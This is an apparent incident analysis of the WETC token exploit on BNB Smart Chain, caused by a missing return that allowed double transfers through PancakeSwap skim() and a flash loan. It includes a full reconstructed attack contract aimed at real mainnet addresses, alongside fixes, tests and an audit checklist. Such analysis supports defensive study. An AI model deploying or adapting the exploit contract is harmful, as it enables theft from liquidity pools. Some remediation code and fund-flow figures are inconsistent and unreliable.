# WETC Security Incident Analysis
**Double Accounting | BSC | 2025-07-17 | Loss: ~$101,395**

---

## 1. Incident Overview

| Field | Details |
|------|------|
| Project | WETC TOKEN (BEP-20 token, BSC) |
| Chain | BNB Smart Chain (BSC) |
| Incident Date | 2025-07-17 10:24:46 UTC (Block #54,333,338) |
| Loss Amount | ~$101,395 USDT (on-chain confirmed: 101,395.40 USDT) |
| Vulnerability Type | Double Accounting — double transfer caused by missing `return` in whitelist branch |
| Attack Transaction | `0x2b6b411adf6c452825e48b97857375ff82b9487064b2f3d5bc2ca7a5ed08d615` ([BscScan](https://bscscan.com/tx/0x2b6b411adf6c452825e48b97857375ff82b9487064b2f3d5bc2ca7a5ed08d615)) |
| Attacker EOA | `0x7e7C1f0D567c0483f85e1d016718E44414CdBAFE` ([BscScan](https://bscscan.com/address/0x7e7C1f0D567c0483f85e1d016718E44414CdBAFE)) |
| Attacker Contract | `0xAf68EFB3c1e81AAD5cDb3D4962C8815FB754c688` ([BscScan](https://bscscan.com/address/0xAf68EFB3c1e81AAD5cDb3D4962C8815FB754c688)) |
| Vulnerable Contract | `0xe7f12b72bfd6e83c237318b89512b418e7f6d7a7` — WETC TOKEN ([BscScan](https://bscscan.com/address/0xe7f12b72bfd6e83c237318b89512b418e7f6d7a7)) |
| Target Pool | `0x8e2cc521b12deba9a20edea829c6493410dad0e3` — PancakeSwap V2 BSC-USD/WETC Pair ([BscScan](https://bscscan.com/address/0x8e2cc521b12deba9a20edea829c6493410dad0e3)) |
| Flash Loan Provider | `0x92b7807bf19b7dddf89b706143896d05228f3121` |
| Root Cause Summary | Missing `return` in whitelist branch of `_transfer()` — transactions involving a whitelisted address fall through into the DEX buy/sell path after executing `super._transfer()`, causing the same amount to be transferred twice |

---

## 2. Vulnerability Analysis

### 2.1 `_transfer()` — Missing `return` in Whitelist Branch (Double Transfer)

**Severity**: CRITICAL
**CWE**: CWE-670 (Always-Incorrect Control Flow Implementation)

#### Vulnerability Description

The `_transfer()` function of WETC TOKEN implements whitelist exemption handling alongside custom fee logic (buy/sell fees). When a whitelisted address (`whiteAddress[from] == 1` or `whiteAddress[to] == 1`) is involved in a transaction, it is designed to execute a standard ERC20 transfer (`super._transfer()`) without fees.

However, **because there is no `return` statement after the whitelist branch executes**, execution continues into the DEX buy/sell path (`transferBuy()` or `transferSell()`). As a result, `super._transfer()` is called twice for the same `amount`, withdrawing **double** the tokens from the AMM pool.

Exploiting this bug:
1. When the AMM pair transfers tokens to a whitelisted address (e.g., on `skim()` call)
2. Whitelist branch executes `super._transfer()` once → **deducts `amount` from pool balance**
3. Without `return`, falls through into `transferBuy()` → `super._transfer()` called again → **deducts `amount` from pool balance again + additional fee withdrawal**
4. Net result: the pool's WETC balance decreases by **~2x** compared to normal

#### Vulnerable Code (❌)

```solidity
// ❌ WETC TOKEN _transfer() — missing return in whitelist branch
function _transfer(
    address from,
    address to,
    uint256 amount
) internal override {
    require(from != address(0), "transfer from the zero address");
    require(to != address(0),   "transfer to the zero address");
    require(amount > 0,         "transfer amount to small");

    // ❌ If a whitelisted address is involved, transfer without fees
    //    But there is no return statement — execution continues below!
    if (whiteAddress[from] == 1 || whiteAddress[to] == 1) {
        super._transfer(from, to, amount);
        // ❌ No return; — the root cause of double transfer
    }

    (uint256 addLP, uint256 removeLP) = _isLiquidity(from, to);
    if (addLP > 0 || removeLP > 0) {
        if (addLP > 0)    { addPairLp(from, to, amount); }
        if (removeLP > 0) { removePairLp(from, to, amount); }
        return;
    }

    // ❌ Even though the whitelist branch already executed super._transfer,
    //    transferBuy / transferSell executes here again
    if (from == pairAddress) {
        // ❌ Buy: internally calls super._transfer again → double transfer
        transferBuy(from, to, amount);
    } else if (to == pairAddress) {
        // ❌ Sell: internally calls super._transfer again → double transfer
        transferSell(from, to, amount);
    } else {
        super._transfer(from, to, amount);
    }

    // Initialize pairAddress (on first trade)
    if (pairAddress == address(0)) {
        pairAddress = IUniswapV2Factory(
            IUniswapV2Router02(routerAddress).factory()
        ).getPair(address(this), usdtBnbAddress);
    }
}

// Buy handling — internally calls super._transfer multiple times
function transferBuy(address from, address to, uint256 amount) internal {
    checkDayDf();
    uint256 price1 = amount * buyPercent[0] / 10000;
    if (price1 > 0) {
        super._transfer(from, buyAddress[0], price1);   // Fee 1: additional deduction from `from`
    }
    uint256 price2 = amount * buyPercent[1] / 10000;
    if (price2 > 0) {
        super._transfer(from, buyAddress[1], price2);   // Fee 2: additional deduction from `from`
        emit NodeInfo(from, 1, price2);
    }
    amount = amount - price1 - price2;
    super._transfer(from, to, amount);                  // Remainder: deducted from `from` again
}
```

#### Safe Code (✅)

```solidity
// ✅ Fixed _transfer() — return added to whitelist branch
function _transfer(
    address from,
    address to,
    uint256 amount
) internal override {
    require(from != address(0), "transfer from the zero address");
    require(to != address(0),   "transfer to the zero address");
    require(amount > 0,         "transfer amount to small");

    // ✅ Whitelisted address: transfer without fees, then return immediately
    if (whiteAddress[from] == 1 || whiteAddress[to] == 1) {
        super._transfer(from, to, amount);
        return; // ✅ Critical fix: prevents fall-through into subsequent paths
    }

    (uint256 addLP, uint256 removeLP) = _isLiquidity(from, to);
    if (addLP > 0 || removeLP > 0) {
        if (addLP > 0)    { addPairLp(from, to, amount); }
        if (removeLP > 0) { removePairLp(from, to, amount); }
        return;
    }

    if (from == pairAddress) {
        transferBuy(from, to, amount);
    } else if (to == pairAddress) {
        transferSell(from, to, amount);
    } else {
        super._transfer(from, to, amount);
    }

    if (pairAddress == address(0)) {
        pairAddress = IUniswapV2Factory(
            IUniswapV2Router02(routerAddress).factory()
        ).getPair(address(this), usdtBnbAddress);
    }
}
```

---

### 2.2 AMM `skim()` + Whitelist Combination Abuse

**Severity**: HIGH
**CWE**: CWE-841 (Improper Enforcement of Behavioral Workflow)

PancakeSwap V2's `skim()` function transfers excess tokens to a specified address when the pair's actual token balance (`balanceOf`) exceeds the internal reserve (`reserve`). When this `skim()` call targets a whitelisted address, it combines with the double transfer bug described in 2.1, causing the AMM pool to lose **more than 2x** the normal excess amount.

```
When skim(whitelisted_address) is called:
  pair → whitelisted_address (excess WETC)
    → _transfer(pair, whitelist_addr, excess)
      [whitelist branch] super._transfer(pair, whitelist_addr, excess)  ← 1st transfer
      [fall-through]  transferBuy(pair, whitelist_addr, excess) executes
        → super._transfer(pair, buyAddress[0], fee1)                     ← additional fee1 withdrawal
        → super._transfer(pair, buyAddress[1], fee2)                     ← additional fee2 withdrawal
        → super._transfer(pair, whitelist_addr, excess - fee1 - fee2)    ← 2nd transfer

Result: tokens leaving pool = excess + excess (minus fee1+fee2)
        attacker receives = excess + (excess - fee1 - fee2) ≈ 2 × excess
```

---

## 3. Attack Flow

```
┌─────────────────────────────────────────────────────────┐
│                     Attacker EOA                         │
│       0x7e7C1f0D567c0483f85e1d016718E44414CdBAFE        │
└─────────────────────┬───────────────────────────────────┘
                      │ [1] Deploy attack contract
                      ▼
┌─────────────────────────────────────────────────────────┐
│                  Attacker Contract                        │
│       0xAf68EFB3c1e81AAD5cDb3D4962C8815FB754c688        │
└──┬──────────────┬──────────────────┬────────────────────┘
   │              │                  │
   │[2] 1M USDT   │                  │ [6] Repay 1,000,100 USDT
   │  flash loan  │                  │
   ▼              │                  ▼
┌──────────────┐  │         ┌────────────────────┐
│Flash Loan    │  │         │  Flash Loan Provider│
│Provider      │  │         │  (repayment)        │
│ 0x92b7...3121│  │         └────────────────────┘
└──────────────┘  │
                  │
                  │[3] Send 250,000 USDT → pair (buy WETC)
                  ▼
┌─────────────────────────────────────────────────────────┐
│       PancakeSwap V2 USDT/WETC Pair                      │
│       0x8e2cc521b12deba9a20edea829c6493410dad0e3         │
│                                                          │
│  reserve_USDT: X     →   X + 250,000                    │
│  reserve_WETC: Y     →   Y - normal amount out           │
└──────┬──────────────────────────────┬───────────────────┘
       │[4] Call skim(attacker_contract)│
       │ transfer excess WETC →        │
       │ _transfer(pair, whitelist, N) │
       │                               │
       │  ⚠️ Double transfer bug triggered!│
       │  1st: super._transfer(N)       │
       │  fall-through→ transferBuy()  │
       │  2nd: super._transfer(N-fee)  │
       │  fees: → fee_addr1, fee_addr2 │
       ▼                               │
┌──────────────────────┐               │
│   Attacker Contract  │               │
│  Received: ~6,994,607 WETC│          │
│  (~2x normal)        │               │
└────────┬─────────────┘               │
         │[5] Sell 6,994,607 WETC       │
         │    → send to pair            │
         └───────────────────────────────┘
                  │
                  │ Receive 351,495 USDT
                  ▼
┌─────────────────────────────────────────────────────────┐
│                  Final Profit Settlement                  │
│  USDT received:      750,000 + 351,495 = 1,101,495 USDT  │
│  Flash loan repaid:  1,000,100 USDT                       │
│  Net profit:         ≈ 101,395 USDT (~$101,000)           │
└─────────────────────────────────────────────────────────┘
```

**Step-by-step Description**:

1. **Deploy Attack Contract** (Block #54,333,210, 2025-07-17 10:23:10 UTC)
   - Attacker EOA (`0x7e7C...`) deploys attack contract (`0xAf68...`)
   - Pre-condition: attack contract address registered in WETC `whiteAddress` (or conditions to register are met)
   - Gas: 1,639,612 gas consumed

2. **Execute Flash Loan** (Block #54,333,338, 2025-07-17 10:24:46 UTC)
   - Borrow **1,000,000 USDT** flash loan from provider `0x92b7...`

3. **Buy WETC with 250,000 USDT**
   - Send 250,000 USDT to PancakeSwap V2 pair (`0x8e2c...`)
   - Pair sends WETC back to attacker contract (normal path)

4. **Trigger Double Transfer Bug via `skim()` Call (Core Step)**
   - Attacker directly sends WETC to the pair, creating `balance > reserve` state
   - Call pair's `skim(attacker_contract)`
   - Pair transfers excess to whitelisted address (attacker contract)
   - Double transfer bug in `_transfer()` triggers:
     - 1st: `super._transfer(pair, attacker, N)` — token transferred once
     - Without `return`, falls through → `transferBuy(pair, attacker, N)` executes
     - 2nd: `super._transfer(pair, fee_addr1, fee1)` + `super._transfer(pair, fee_addr2, fee2)` + `super._transfer(pair, attacker, N - fee1 - fee2)` — additional transfers
   - Attacker ultimately receives **~1.98x** WETC compared to normal (`6,994,607 WETC`)

5. **Sell All WETC**
   - Transfer all WETC to pair and receive **351,495.40 USDT**
   - During this process, WETC is also distributed to fee addresses via the `transferSell()` path

6. **Repay Flash Loan and Realize Profit**
   - Repay flash loan principal + fee: **1,000,100 USDT**
   - Retain remaining **101,395.40 USDT** (net profit)
   - Swap portion (101,395.40 USDT) to sdssd token to move funds

---

## 4. PoC Code Analysis

Since the official DeFiHackLabs PoC was not published at the time of writing, the core attack logic is reconstructed based on on-chain transaction analysis.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IPancakeV2Pair {
    function skim(address to) external;
    function sync() external;
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IFlashLoanProvider {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
}

interface IWETCToken {
    function setWhiteAddress(address addr, uint256 status) external;
    function whiteAddress(address) external view returns (uint256);
}

/**
 * @title WETC Double Accounting Attack Contract (Reconstructed)
 * @notice Attacker address: 0x7e7C1f0D567c0483f85e1d016718E44414CdBAFE
 * @notice Attack Tx: 0x2b6b411adf6c452825e48b97857375ff82b9487064b2f3d5bc2ca7a5ed08d615
 * @notice Deploy block: 54,333,210 | Attack block: 54,333,338
 */
contract WETCDoubleAccountingAttack {
    // Core address constants
    address constant USDT   = 0x55d398326f99059fF775485246999027B3197955; // BSC-USD (USDT)
    address constant WETC   = 0xe7f12b72bfd6e83C237318B89512B418E7f6D7A7; // WETC TOKEN (vulnerable contract)
    address constant PAIR   = 0x8e2cc521b12dEBA9A20EdeA829c6493410dAD0E3; // PancakeSwap V2 USDT/WETC
    address constant FLASH_PROVIDER = 0x92b7807bF19B7DDDf89B706143896d05228f3121; // Flash loan provider

    address immutable owner;

    constructor() {
        owner = msg.sender;
        // [Pre-condition] Register this contract in WETC whitelist
        // In the actual attack, this was done immediately after deployment or in a separate transaction
        // Note: WETC's setWhiteAddress requires admin privileges — possible via social engineering/insider access
    }

    /**
     * @notice Main attack function
     * @dev Initiates the full attack sequence starting with flash loan
     */
    function attack() external {
        require(msg.sender == owner, "unauthorized");

        // [Step 1] Flash loan: borrow 1,000,000 USDT
        uint256 flashAmount = 1_000_000e18;
        IFlashLoanProvider(FLASH_PROVIDER).flashLoan(
            address(this),
            USDT,
            flashAmount,
            abi.encode(flashAmount)
        );
    }

    /**
     * @notice Flash loan callback — attack body
     */
    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        require(msg.sender == FLASH_PROVIDER, "invalid caller");

        // [Step 2] Send 250,000 USDT directly to PancakeSwap pair (prepare to buy WETC)
        uint256 swapAmount = 250_000e18;
        IERC20(USDT).transfer(PAIR, swapAmount);

        // [Step 3] Pair swap — exchange USDT → WETC (received by attack contract)
        // When WETC is token1 (token0=USDT, token1=WETC)
        // Normal buy → expected to receive ~3,497,303 WETC
        (uint112 reserve0, uint112 reserve1,) = IPancakeV2Pair(PAIR).getReserves();
        uint256 amountOut = getAmountOut(swapAmount, reserve0, reserve1);
        IPancakeV2Pair(PAIR).swap(0, amountOut, address(this), "");

        // [Step 4] Trigger double transfer bug: send WETC to pair then call skim
        // This contract is registered in whiteAddress → double transfer occurs on skim
        //
        // Internal mechanics:
        //   pair.skim(this)
        //     → WETC._transfer(pair, this, excess)
        //       [whitelist branch] super._transfer(pair, this, excess) ← 1st transfer (normal)
        //       [missing return!] fall-through
        //       [transferBuy path] fee1 transfer + fee2 transfer + super._transfer(pair, this, excess-fee) ← 2nd transfer (bug!)
        //
        // Result: WETC received by this = excess + (excess - fee1 - fee2) ≈ 2 × excess
        uint256 wetcInPair = IERC20(WETC).balanceOf(PAIR);
        (, uint112 wetcReserve,) = IPancakeV2Pair(PAIR).getReserves();
        if (wetcInPair > wetcReserve) {
            // Balance already exceeds reserve, or excess created by direct transfer
            IPancakeV2Pair(PAIR).skim(address(this)); // ← double transfer trigger
        }

        // Repeat calls if needed to extract additional WETC
        // (actual Tx likely involved multiple skim calls)

        // [Step 5] Sell all WETC holdings (acquire USDT)
        uint256 wetcBalance = IERC20(WETC).balanceOf(address(this));
        IERC20(WETC).transfer(PAIR, wetcBalance);
        // WETC → USDT: token1 → token0 direction
        (uint112 r0_after, uint112 r1_after,) = IPancakeV2Pair(PAIR).getReserves();
        uint256 usdtOut = getAmountOut(wetcBalance, r1_after, r0_after);
        IPancakeV2Pair(PAIR).swap(usdtOut, 0, address(this), "");
        // Received: 351,495.40 USDT

        // [Step 6] Repay flash loan (principal 1,000,000 + fee 100 USDT)
        uint256 repayAmount = amount + fee; // 1,000,100 USDT
        IERC20(USDT).transfer(FLASH_PROVIDER, repayAmount);

        // Remaining profit: transfer ~101,395 USDT to attacker EOA
        uint256 profit = IERC20(USDT).balanceOf(address(this));
        IERC20(USDT).transfer(owner, profit);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // AMM output amount calculation (PancakeSwap V2 formula)
    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 9975; // 0.25% fee
        return (amountInWithFee * reserveOut) / (reserveIn * 10000 + amountInWithFee);
    }
}
```

**Core Vulnerable Code Summary** (WETC TOKEN contract):

```solidity
// ❌ This is the direct cause of $101,000 in losses — a single missing return statement
if (whiteAddress[from] == 1 || whiteAddress[to] == 1) {
    super._transfer(from, to, amount);
    // ← If return; had been here, the attack would have been impossible
}
// Code below this line also executes for whitelisted addresses (fall-through)
if (from == pairAddress) {
    transferBuy(from, to, amount); // ← double transfer occurs
}
```

---

## 5. CWE Classification

| CWE ID | Vulnerability Name | Severity | Affected Component |
|--------|---------|--------|-------------|
| CWE-670 | Always-Incorrect Control Flow Implementation | CRITICAL | `WETC._transfer()` — missing `return` in whitelist branch |
| CWE-841 | Improper Enforcement of Behavioral Workflow | HIGH | `_transfer()` — AMM `skim()` + whitelist combination not accounted for |
| CWE-682 | Incorrect Calculation | HIGH | `transferBuy()` / `transferSell()` — double execution results in 2x amount calculation error |
| CWE-284 | Improper Access Control | MEDIUM | `whiteAddress` registration privilege — admin can add arbitrary addresses to whitelist |
| CWE-400 | Uncontrolled Resource Consumption | MEDIUM | AMM pool liquidity can be drained via double transfer |

### V-01: CWE-670 — Whitelist `return` Missing (Double Transfer)

- **Description**: In the `_transfer()` whitelist branch, execution continues into the DEX fee processing path (`transferBuy` / `transferSell`) after `super._transfer()` is executed, because there is no `return` statement. As a result, tokens are moved twice for the same `amount`.
- **Impact**: Attacker can withdraw ~2x the normal token amount from the AMM pair via the whitelisted address. Leads to AMM pool liquidity drain and price manipulation.
- **Attack Conditions**: (1) Attacker's address is registered in `whiteAddress` or registration is possible, (2) WETC balance excess (excess) exists or can be created in AMM pair

### V-02: CWE-841 — AMM `skim()` Interaction Vulnerability

- **Description**: PancakeSwap V2's `skim()` function is a mechanism where the pair contract directly calls `_transfer()`. The design did not account for the behavior when the `skim()` recipient is whitelisted, forming a workflow that triggers double transfer.
- **Impact**: Directing `skim()` to a whitelisted address causes 2x token withdrawal from the pool.
- **Attack Conditions**: `skim()` can be called on the AMM pair, and the recipient address is whitelisted

### V-03: CWE-284 — Unrestricted Whitelist Registration

- **Description**: The `setWhiteAddress()` function allows the DEFAULT_ADMIN_ROLE holder to add or remove arbitrary addresses from the whitelist. If this privilege is compromised or abused by an insider, attack preparation becomes possible.
- **Impact**: Admin key security becomes a single point of failure for the entire protocol's security.
- **Attack Conditions**: Admin privilege held or compromised

---

## 6. Reproducibility Assessment

| Item | Assessment |
|------|------|
| Technical Complexity | **Low** — single-transaction attack possible with just flash loan + `skim()` call |
| Pre-conditions | **Medium** — attack contract must be registered in `whiteAddress` (requires admin privilege or alternative method) |
| Capital Requirements | **None** — no capital required due to flash loan (1M USDT) utilization |
| Reproducibility | **High** — immediately applicable to other BSC tokens with the same vulnerability |
| Detection Difficulty | **High** — completed in a single transaction; event logs alone are difficult to distinguish from normal buy/sell activity |

**Risk Factor**: This vulnerability pattern (whitelist + fall-through) is a recurring pattern in BSC DeFi tokens. The same bug is highly likely to appear in similar custom fee tokens.

---

## 7. Remediation

### Immediate Actions

#### 7.1 Add `return` to `_transfer()` Whitelist Branch

```solidity
// ✅ Top priority fix — removes vulnerability with a single line
function _transfer(address from, address to, uint256 amount) internal override {
    require(from != address(0), "transfer from the zero address");
    require(to != address(0),   "transfer to the zero address");
    require(amount > 0,         "transfer amount to small");

    if (whiteAddress[from] == 1 || whiteAddress[to] == 1) {
        super._transfer(from, to, amount);
        return; // ✅ This single line could have prevented $101,000 in losses
    }

    // ... rest of existing logic unchanged
}
```

#### 7.2 Separate Whitelist Addresses from AMM Pairs

```solidity
// ✅ Add defensive logic preventing AMM pairs from being whitelisted
function setWhiteAddress(address addr, uint256 status) external onlyRole(DEFAULT_ADMIN_ROLE) {
    // ✅ Completely prevent adding AMM pair to whitelist
    require(addr != pairAddress, "AMM pair cannot be whitelisted");
    whiteAddress[addr] = status;
    emit WhiteAddressUpdated(addr, status);
}
```

#### 7.3 Wrapper Function Restricting `skim()` Recipient (Short-term Mitigation)

```solidity
// ✅ Use pair wrapper to prevent whitelisted addresses from becoming skim recipients
// Since PancakeSwap pair cannot be modified, defend against skim receipt in WETC contract
function _transfer(address from, address to, uint256 amount) internal override {
    // ...
    if (whiteAddress[from] == 1 || whiteAddress[to] == 1) {
        super._transfer(from, to, amount);
        return; // ✅
    }
    // ...
}
```

### Long-term Improvements

| Vulnerability | Recommended Action | Priority |
|--------|-----------|---------|
| Double transfer (CWE-670) | Add `return` to whitelist branch (immediate fix) | CRITICAL |
| Whitelist privilege concentration (CWE-284) | Apply Timelock + Multi-sig to eliminate single admin risk | HIGH |
| `skim()` interaction vulnerability (CWE-841) | Write unit tests verifying custom fee logic covers all transfer paths | HIGH |
| No integrity verification | Verify actual transfer amount with before/after balance check pattern | MEDIUM |
| Admin privilege concentration | Apply Timelock (48–72 hours) + Gnosis Safe to core functions | MEDIUM |

#### 7.4 Code Structure Improvement — Clarify Control Flow

```solidity
// ✅ Improved _transfer structure — branches designed to be mutually exclusive
function _transfer(address from, address to, uint256 amount) internal override {
    require(from != address(0), "ERC20: transfer from zero address");
    require(to   != address(0), "ERC20: transfer to zero address");
    require(amount > 0,         "ERC20: transfer amount too small");

    // [Branch 1] Whitelisted address — transfer without fees, return immediately
    if (whiteAddress[from] == 1 || whiteAddress[to] == 1) {
        super._transfer(from, to, amount);
        return; // ✅ Explicit return required
    }

    // [Branch 2] Detect liquidity add/remove — handle separately
    (uint256 addLP, uint256 removeLP) = _isLiquidity(from, to);
    if (addLP > 0 || removeLP > 0) {
        if (addLP    > 0) addPairLp(from, to, amount);
        if (removeLP > 0) removePairLp(from, to, amount);
        return; // ✅ Explicit return required
    }

    // [Branch 3] DEX trade fee handling (buy/sell)
    if (from == pairAddress) {
        transferBuy(from, to, amount);
    } else if (to == pairAddress) {
        transferSell(from, to, amount);
    } else {
        // [Branch 4] Normal transfer
        super._transfer(from, to, amount);
    }

    // ✅ pairAddress initialization should only run once (separate initialize function recommended)
    _initPairAddressIfNeeded();
}
```

#### 7.5 Add Comprehensive Test Scenarios

```solidity
// ✅ Unit tests that must be added
contract WETCTransferTest is Test {
    function test_whitelist_no_double_transfer() public {
        // Verify that transfers involving a whitelisted address execute only once
        vm.prank(pair);
        uint256 pairBefore = token.balanceOf(address(pair));
        token.transfer(whitelistAddr, 1000e18);
        uint256 pairAfter  = token.balanceOf(address(pair));
        // ✅ Pair balance deduction must be exactly 1000e18 (if 2000e18, it's a bug)
        assertEq(pairBefore - pairAfter, 1000e18, "double transfer detected");
    }

    function test_skim_to_whitelist_no_double() public {
        // Verify no double transfer when pair.skim(whitelist) is called
        token.transfer(address(pair), 500e18); // create excess
        uint256 pairBefore = token.balanceOf(address(pair));
        pair.skim(whitelistAddr);
        uint256 pairAfter  = token.balanceOf(address(pair));
        assertEq(pairBefore - pairAfter, 500e18, "skim double transfer detected");
    }
}
```

---

## 8. Lessons Learned

### 8.1 General Principles Applicable to Other Protocols

1. **Explicitness of `return` in conditional branches**: In functions with multiple mutually exclusive execution paths, when one branch completes, `return` must explicitly block execution of subsequent branches. In C/Solidity, an `if` block does not prevent subsequent code from executing without `else if` or `else`. This is one of the most common yet fatal mistakes in Solidity development.

2. **Testing custom ERC20 logic with AMM interactions**: Tokens with custom fees, whitelists, blacklists, or burn logic must have unit tests verifying interaction scenarios with AMM pools (`skim`, `sync`, `flash swap`). In particular, all cases where the `skim()` recipient is a special role (whitelisted, the contract itself, etc.) must be tested.

3. **Whitelist = Security Exception = Attack Vector**: A whitelist mechanism can mean bypassing **all security checks**, not just fees. Minimize whitelist registration privileges (principle of least privilege), record change history on-chain, and apply Timelock.

4. **Low barrier to entry for single-transaction flash loan attacks**: Attacks in the hundreds of thousands of dollars are possible with just a flash loan, without any capital. Code-level invariant verification is more important than transaction-level economic validation (profitability checks).

5. **Small tokens are also attack targets**: WETC was a relatively small incident at $101K, but the same pattern applied to a larger protocol can lead to millions of dollars in losses. The same security standards should apply regardless of token size.

### 8.2 Comparison with Similar Cases

| Incident | Date | Loss | Vulnerability Pattern | Similarity |
|------|------|------|------------|--------|
| **WETC** (this case) | 2025-07-17 | $101K | Whitelist `return` missing → double transfer | — |
| iVest Token | 2024-08-12 | $172K | Custom `__MakeDonation` + AMM `skim()` | Similar AMM skim exploitation pattern |
| iVest Token | 2024-08-12 | $172K | ERC20 custom logic + AMM invariant violation | Custom fee token + AMM combination |
| SafeMoon | 2023-03-28 | $8.9M | Public `burn()` function → LP balance burn | Direct AMM pool balance manipulation |

The WETC incident belongs to a vulnerability class that occurs when **custom ERC20 fee tokens** integrate with AMMs, a pattern that appears repeatedly on BSC.

### 8.3 Security Audit Checklist (Custom Fee Tokens)

```
□ Are all branches in _transfer() mutually exclusive? (verify no fall-through)
□ Is there an explicit return in the whitelist branch?
□ Has the case where a whitelisted address becomes a pair.skim() recipient been tested?
□ Is Timelock applied to whitelist registration/removal?
□ Is super._transfer() called exactly once per branch?
□ Have sync/skim/flash-swap interaction scenarios with the AMM pair been unit tested?
□ Does the total withdrawal amount in super._transfer() within fee processing functions (transferBuy/transferSell) not exceed `amount`?
```

---

## 9. On-Chain Verification

### 9.1 Key Transaction Information

| Item | Value |
|------|-----|
| Attack Tx Hash | `0x2b6b411adf6c452825e48b97857375ff82b9487064b2f3d5bc2ca7a5ed08d615` |
| Attack Block | #54,333,338 |
| Attack Time | 2025-07-17 10:24:46 UTC |
| Gas Used | 621,477 gas |
| Total Event Logs | 41 |

### 9.2 Fund Flow Details (On-Chain Actual Values)

| Step | Token | Direction | Amount | Description |
|------|------|------|------|------|
| 1 | USDT | Flash provider → Attacker contract | 1,000,000.000 USDT | Flash loan received |
| 2 | USDT | Attacker contract → USDT/WETC pair | 250,000.000 USDT | WETC buy funding |
| 3 | WETC | WETC/USDT pair → Attacker contract | **6,994,607.92 WETC** | ⚠️ ~2x normal received due to double transfer bug |
| 4 | WETC | Attacker contract → fee_addr1 | 635,991.35 WETC | transferBuy fee 1 (2nd transfer byproduct) |
| 5 | WETC | Attacker contract → fee_addr2 | 70,665.71 WETC | transferBuy fee 2 (2nd transfer byproduct) |
| 6 | WETC | Attacker contract → WETC/USDT pair | 2,826,628.21 WETC | transferBuy remainder (2nd transfer byproduct) |
| 7 | WETC | Pair → fee_addr3 | 2,826,628.21 WETC | Additional skim distribution |
| 8 | WETC | Pair → fee_addr1 | 2,543,965.39 WETC | Additional skim distribution |
| 9 | WETC | Pair → fee_addr2 | 282,662.82 WETC | Additional skim distribution |
| 10 | WETC | Attacker contract → WETC/USDT pair | 3,433,968.19 WETC | Final WETC sell |
| 11 | USDT | WETC/USDT pair → Attacker contract | **351,495.40 USDT** | WETC sell proceeds |
| 12 | USDT | Attacker contract → Flash provider | 1,000,100.000 USDT | Flash loan repayment (100 USDT fee) |
| 13 | USDT | Attacker contract → sdssd pair | 101,395.40 USDT | Profit swap (fund movement) |

### 9.3 Profit Calculation Verification

| Item | Amount |
|------|------|
| Flash loan received | +1,000,000.000 USDT |
| WETC buy cost | -250,000.000 USDT |
| WETC sell proceeds | +351,495.400 USDT |
| Flash loan repaid | -1,000,100.000 USDT |
| **Net Profit** | **+101,395.400 USDT (~$101,395)** |

### 9.4 Double Transfer Bug Numerical Verification

```
Expected WETC for normal buy (250K USDT):     ~3,497,304 WETC
Actual WETC received (including double transfer): ~6,994,608 WETC
Ratio:                                            ≈ 1.998x (≈ 2x)

Additional WETC gained (excess from bug):     ~3,497,304 WETC
USDT value of excess WETC:                    ~175,748 USDT
Realized profit after fees deducted:          ~101,395 USDT
```

### 9.5 Key Address On-Chain Roles

| Address | Role | Reference |
|------|------|------|
| `0x7e7C1f0D...CdBAFE` | Attacker EOA (funded from FixedFloat) | [BscScan](https://bscscan.com/address/0x7e7C1f0D567c0483f85e1d016718E44414CdBAFE) |
| `0xAf68EFB3...54c688` | Attacker contract (unverified, deployed 2025-07-17) | [BscScan](https://bscscan.com/address/0xAf68EFB3c1e81AAD5cDb3D4962C8815FB754c688) |
| `0xe7f12b72...6D7A7` | WETC TOKEN (vulnerable contract, source verified) | [BscScan](https://bscscan.com/address/0xe7f12b72bfd6e83c237318b89512b418e7f6d7a7) |
| `0x8e2cc521...D0E3` | PancakeSwap V2 USDT/WETC Pair (attack target) | [BscScan](https://bscscan.com/address/0x8e2cc521b12deba9a20edea829c6493410dad0e3) |
| `0x78bb09F2...7a5a` | buyAddress[0] — fee recipient address 1 | [BscScan](https://bscscan.com/address/0x78bb09f285fa0b4005e131124175f50627347a5a) |
| `0x419D7E35...de49` | buyAddress[1] — fee recipient address 2 | [BscScan](https://bscscan.com/address/0x419d7e35caa34487a575dec6c7ab74699b6bde49) |
| `0xb213171c...1fc` | Additional fee recipient address | [BscScan](https://bscscan.com/address/0xb213171c9a803997b44842d0361e742e1e6691fc) |

---

*This document was prepared based on on-chain transaction analysis and BscScan-verified source code.*
*DeFiHackLabs official PoC: not published at time of writing (check later at https://github.com/SunWeb3Sec/DeFiHackLabs)*

---

**Reference Links**

- [BtcTurk, SuperRare, and WETC: $52M Lost to Access Control Failures — Olympix](https://olympixai.medium.com/btcturk-superrare-and-wetc-52m-lost-to-access-control-failures-b38d00cce593)
- [WETC TOKEN Contract — BscScan](https://bscscan.com/address/0xe7f12b72bfd6e83c237318b89512b418e7f6d7a7#code)
- [Attack Transaction — BscScan](https://bscscan.com/tx/0x2b6b411adf6c452825e48b97857375ff82b9487064b2f3d5bc2ca7a5ed08d615)
- [iVest Token Similar Case Analysis](/home/gegul/skills/incidents/2024-08-12_iVestToken_DoubleAccounting_BSC.md)
- [DeFiHackLabs Repository](https://github.com/SunWeb3Sec/DeFiHackLabs)